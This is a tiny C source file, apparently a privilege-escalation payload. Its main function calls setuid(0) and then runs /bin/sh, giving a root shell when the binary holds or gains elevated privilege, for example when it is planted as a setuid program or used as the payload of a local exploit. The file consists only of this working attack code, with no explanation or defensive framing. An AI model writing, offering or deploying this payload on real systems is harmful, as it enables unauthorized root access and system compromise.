#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

void main()
{
	setuid(0); system("/bin/sh");
}
